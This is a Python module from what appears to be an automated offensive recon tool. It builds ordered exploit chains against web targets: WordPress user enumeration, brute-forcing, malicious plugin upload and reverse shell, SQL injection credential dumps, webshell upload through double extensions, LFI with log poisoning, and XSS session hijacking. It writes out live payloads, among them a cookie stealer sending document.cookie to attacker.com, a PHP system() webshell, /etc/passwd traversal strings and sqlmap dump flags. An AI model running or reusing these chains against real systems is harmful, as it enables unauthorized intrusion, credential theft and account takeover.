"""
ai/chain_planner.py - Exploit Chain Builder
Lên kế hoạch exploit chain dựa trên findings
Ví dụ: user enum → password brute → login → upload plugin → reverse shell
"""

import logging
from typing import Dict, List, Optional
from dataclasses import dataclass, field

logger = logging.getLogger("recon.chain_planner")


@dataclass
class ExploitStep:
    name: str
    action: str
    target: str
    tool: Optional[str] = None
    payload: Optional[str] = None
    depends_on: List[str] = field(default_factory=list)
    success_indicator: str = ""
    priority: int = 5


@dataclass
class ExploitChain:
    name: str
    description: str
    steps: List[ExploitStep]
    risk_level: str = "HIGH"
    estimated_time: str = "unknown"
    prerequisites: List[str] = field(default_factory=list)


class ChainPlanner:
    """
    Plans exploit chains based on discovered vulnerabilities and findings.
    Prioritizes chains by impact and feasibility.
    """

    def __init__(self, state_manager):
        self.state = state_manager

    def plan_chains(self) -> List[ExploitChain]:
        """Analyze state and build relevant exploit chains"""
        chains = []

        vulns = self.state.get("vulnerabilities", [])
        wp_detected = self.state.get("wordpress_detected", False)
        wp_users = self.state.get("wp_users", [])
        wp_plugins = self.state.get("wp_plugins", [])
        endpoints = self.state.get("prioritized_endpoints", [])
        live_hosts = self.state.get("live_hosts", [])

        # Check for SQLi vulnerabilities
        sqli_vulns = [v for v in vulns if "sql" in v.get("name", "").lower() or
                      v.get("type", "") == "SQLI"]
        if sqli_vulns:
            chains.append(self._build_sqli_chain(sqli_vulns[0]))

        # WordPress chains
        if wp_detected:
            # WP user enumeration → brute → admin access → RCE chain
            if wp_users:
                chains.append(self._build_wp_admin_chain(wp_users))

            # XML-RPC bruteforce chain
            wp_xmlrpc = any(
                "xmlrpc" in f.get("type", "").lower() or "xmlrpc" in f.get("url", "").lower()
                for h_results in [self.state.get("wp_vulns", [])]
                for f in h_results
            )
            if wp_xmlrpc or wp_detected:
                chains.append(self._build_xmlrpc_chain(wp_users))

            # Vulnerable plugin chain
            vuln_plugins = [p for p in wp_plugins if p.get("vulnerabilities")]
            if vuln_plugins:
                chains.append(self._build_wp_plugin_chain(vuln_plugins[0]))

        # File upload chain
        upload_endpoints = [
            ep for ep in endpoints
            if ep.get("score", 0) >= 8 and "upload" in ep.get("url", "").lower()
        ]
        if upload_endpoints:
            chains.append(self._build_upload_chain(upload_endpoints[0]))

        # LFI chain
        lfi_endpoints = [
            ep for ep in endpoints
            if any(r in ep.get("url", "") for r in ["file=", "page=", "include=", "path="])
        ]
        if lfi_endpoints:
            chains.append(self._build_lfi_chain(lfi_endpoints[0]))

        # XSS → Session hijack chain
        xss_vulns = [v for v in vulns if "xss" in v.get("name", "").lower() or
                     "cross-site" in v.get("name", "").lower()]
        if xss_vulns:
            chains.append(self._build_xss_chain(xss_vulns[0]))

        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains")
        for chain in chains:
            logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")

        return sorted(chains, key=lambda c: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(c.risk_level, 3))

    def _build_wp_admin_chain(self, users: List[str]) -> ExploitChain:
        """WordPress: enumerate → brute → wp-admin → plugin upload → RCE"""
        primary_user = users[0] if users else "admin"

        return ExploitChain(
            name="WordPress Admin Takeover → RCE",
            description="Bruteforce WP credentials, log in as admin, upload malicious plugin for RCE",
            risk_level="CRITICAL",
            estimated_time="15-60 min",
            prerequisites=["WordPress detected", "Login page accessible"],
            steps=[
                ExploitStep(
                    name="User Enumeration",
                    action="enumerate_wp_users",
                    target="wp-json/wp/v2/users",
                    tool="curl",
                    success_indicator="user list extracted",
                    priority=10,
                ),
                ExploitStep(
                    name="Password Bruteforce",
                    action="bruteforce_wp_login",
                    target="wp-login.php",
                    tool="wpscan/hydra",
                    payload=f"username={primary_user}",
                    depends_on=["User Enumeration"],
                    success_indicator="valid credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Admin Login",
                    action="login_wp_admin",
                    target="wp-admin/",
                    tool="curl/browser",
                    depends_on=["Password Bruteforce"],
                    success_indicator="admin dashboard accessible",
                    priority=8,
                ),
                ExploitStep(
                    name="Plugin Upload",
                    action="upload_malicious_plugin",
                    target="wp-admin/plugin-install.php",
                    tool="curl",
                    payload="malicious_plugin.zip",
                    depends_on=["Admin Login"],
                    success_indicator="plugin activated",
                    priority=7,
                ),
                ExploitStep(
                    name="Reverse Shell",
                    action="trigger_reverse_shell",
                    target="wp-content/plugins/malicious/shell.php",
                    tool="nc",
                    payload="cmd=id",
                    depends_on=["Plugin Upload"],
                    success_indicator="shell connection established",
                    priority=6,
                ),
            ]
        )

    def _build_xmlrpc_chain(self, users: List[str]) -> ExploitChain:
        """XML-RPC multicall bruteforce"""
        return ExploitChain(
            name="XML-RPC Multicall Bruteforce",
            description="Abuse XML-RPC system.multicall to test many passwords at once",
            risk_level="HIGH",
            estimated_time="5-20 min",
            prerequisites=["xmlrpc.php accessible"],
            steps=[
                ExploitStep(
                    name="Verify XML-RPC",
                    action="check_xmlrpc",
                    target="xmlrpc.php",
                    tool="curl",
                    payload="system.listMethods",
                    success_indicator="methodResponse received",
                    priority=10,
                ),
                ExploitStep(
                    name="Multicall Bruteforce",
                    action="xmlrpc_multicall",
                    target="xmlrpc.php",
                    tool="custom_script",
                    payload="wp.getUsersBlogs multicall",
                    depends_on=["Verify XML-RPC"],
                    success_indicator="valid credentials in response",
                    priority=9,
                ),
            ]
        )

    def _build_sqli_chain(self, vuln: Dict) -> ExploitChain:
        """SQL injection → data exfil → possible auth bypass"""
        return ExploitChain(
            name="SQL Injection → Data Exfiltration",
            description="Exploit SQLi to dump credentials and sensitive data",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["SQLi vulnerability found"],
            steps=[
                ExploitStep(
                    name="Confirm SQLi",
                    action="test_sqli",
                    target=vuln.get("url", ""),
                    tool="sqlmap",
                    payload="' OR '1'='1",
                    success_indicator="SQL error or boolean difference detected",
                    priority=10,
                ),
                ExploitStep(
                    name="Database Enumeration",
                    action="enumerate_databases",
                    target=vuln.get("url", ""),
                    tool="sqlmap",
                    payload="--dbs",
                    depends_on=["Confirm SQLi"],
                    success_indicator="database list extracted",
                    priority=9,
                ),
                ExploitStep(
                    name="Dump Credentials",
                    action="dump_users_table",
                    target=vuln.get("url", ""),
                    tool="sqlmap",
                    payload="--dump -T users",
                    depends_on=["Database Enumeration"],
                    success_indicator="credentials dumped",
                    priority=8,
                ),
                ExploitStep(
                    name="Auth Bypass",
                    action="try_extracted_credentials",
                    target="login page",
                    tool="curl",
                    depends_on=["Dump Credentials"],
                    success_indicator="authenticated successfully",
                    priority=7,
                ),
            ]
        )

    def _build_upload_chain(self, endpoint: Dict) -> ExploitChain:
        """File upload → webshell → RCE"""
        return ExploitChain(
            name="File Upload → Webshell → RCE",
            description="Bypass file upload restrictions to deploy a webshell",
            risk_level="CRITICAL",
            estimated_time="5-20 min",
            prerequisites=["File upload endpoint found"],
            steps=[
                ExploitStep(
                    name="Test Upload",
                    action="upload_benign_file",
                    target=endpoint.get("url", ""),
                    tool="curl",
                    payload="test.txt",
                    success_indicator="upload successful",
                    priority=10,
                ),
                ExploitStep(
                    name="Bypass Extension Filter",
                    action="upload_php_double_ext",
                    target=endpoint.get("url", ""),
                    tool="curl",
                    payload="shell.php.jpg",
                    depends_on=["Test Upload"],
                    success_indicator="file accepted",
                    priority=9,
                ),
                ExploitStep(
                    name="Execute Webshell",
                    action="trigger_webshell",
                    target="uploads/shell.php",
                    tool="curl",
                    payload="?cmd=id",
                    depends_on=["Bypass Extension Filter"],
                    success_indicator="command output received",
                    priority=8,
                ),
            ]
        )

    def _build_lfi_chain(self, endpoint: Dict) -> ExploitChain:
        """LFI → log poisoning → RCE"""
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Exploit LFI to read sensitive files, then poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI parameter found"],
            steps=[
                ExploitStep(
                    name="Confirm LFI",
                    action="test_lfi",
                    target=endpoint.get("url", ""),
                    payload="../../../../etc/passwd",
                    success_indicator="passwd file content in response",
                    priority=10,
                ),
                ExploitStep(
                    name="Read Config Files",
                    action="read_config",
                    target=endpoint.get("url", ""),
                    payload="../../../../var/www/html/config.php",
                    depends_on=["Confirm LFI"],
                    success_indicator="database credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Log Poisoning",
                    action="inject_php_in_logs",
                    target="User-Agent header",
                    payload="<?php system($_GET['cmd']); ?>",
                    depends_on=["Confirm LFI"],
                    success_indicator="PHP code in logs",
                    priority=8,
                ),
                ExploitStep(
                    name="Execute via LFI",
                    action="include_poisoned_log",
                    target=endpoint.get("url", ""),
                    payload="../../../../var/log/apache2/access.log&cmd=id",
                    depends_on=["Log Poisoning"],
                    success_indicator="RCE achieved",
                    priority=7,
                ),
            ]
        )

    def _build_xss_chain(self, vuln: Dict) -> ExploitChain:
        """XSS → session hijack → account takeover"""
        return ExploitChain(
            name="XSS → Session Hijack → Account Takeover",
            description="Use stored/reflected XSS to steal admin session cookies",
            risk_level="HIGH",
            estimated_time="30-120 min",
            prerequisites=["XSS vulnerability found"],
            steps=[
                ExploitStep(
                    name="Confirm XSS",
                    action="test_xss",
                    target=vuln.get("url", ""),
                    payload="<script>alert(1)</script>",
                    success_indicator="alert triggered",
                    priority=10,
                ),
                ExploitStep(
                    name="Setup Cookie Collector",
                    action="start_listener",
                    target="attacker server",
                    tool="nc/python",
                    success_indicator="server listening",
                    priority=9,
                ),
                ExploitStep(
                    name="Inject Cookie Stealer",
                    action="inject_cookie_stealer",
                    target=vuln.get("url", ""),
                    payload="<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                    depends_on=["Setup Cookie Collector"],
                    success_indicator="admin visits page",
                    priority=8,
                ),
                ExploitStep(
                    name="Session Replay",
                    action="use_stolen_session",
                    target="admin panel",
                    tool="browser/curl",
                    depends_on=["Inject Cookie Stealer"],
                    success_indicator="admin access achieved",
                    priority=7,
                ),
            ]
        )

    def _build_wp_plugin_chain(self, plugin: Dict) -> ExploitChain:
        """Exploit vulnerable WordPress plugin"""
        plugin_name = plugin.get("name", "unknown")
        vulns = plugin.get("vulnerabilities", [])
        vuln_type = vulns[0].get("type", "unknown") if vulns else "unknown"

        return ExploitChain(
            name=f"WordPress Plugin Exploit: {plugin_name}",
            description=f"Exploit {vuln_type} vulnerability in plugin {plugin_name}",
            risk_level="CRITICAL" if "RCE" in vuln_type else "HIGH",
            estimated_time="5-15 min",
            prerequisites=[f"Plugin {plugin_name} installed and active"],
            steps=[
                ExploitStep(
                    name="Confirm Plugin Version",
                    action="check_plugin_version",
                    target=f"wp-content/plugins/{plugin_name}/readme.txt",
                    success_indicator="vulnerable version confirmed",
                    priority=10,
                ),
                ExploitStep(
                    name="Send Exploit Payload",
                    action="exploit_plugin_vuln",
                    target=f"wp-content/plugins/{plugin_name}/",
                    tool="curl/metasploit",
                    payload=f"{vuln_type} payload",
                    depends_on=["Confirm Plugin Version"],
                    success_indicator="exploit successful",
                    priority=9,
                ),
            ]
        )

    def format_chain_report(self, chains: List[ExploitChain]) -> str:
        """Format chains into readable report"""
        lines = [
            "=" * 60,
            "  EXPLOIT CHAIN ANALYSIS",
            "=" * 60,
            f"  {len(chains)} exploit chains identified",
            "",
        ]

        for i, chain in enumerate(chains, 1):
            lines.extend([
                f"[{i}] {chain.name}",
                f"    Risk Level : {chain.risk_level}",
                f"    Est. Time  : {chain.estimated_time}",
                f"    Steps      : {len(chain.steps)}",
                f"    Description: {chain.description}",
                "",
                "    STEPS:",
            ])
            for j, step in enumerate(chain.steps, 1):
                lines.append(f"    {j}. {step.name}")
                lines.append(f"       Action : {step.action}")
                if step.tool:
                    lines.append(f"       Tool   : {step.tool}")
                if step.payload:
                    lines.append(f"       Payload: {step.payload[:60]}")
                lines.append(f"       Success: {step.success_indicator}")
            lines.append("=" * 60)

        return "\n".join(lines)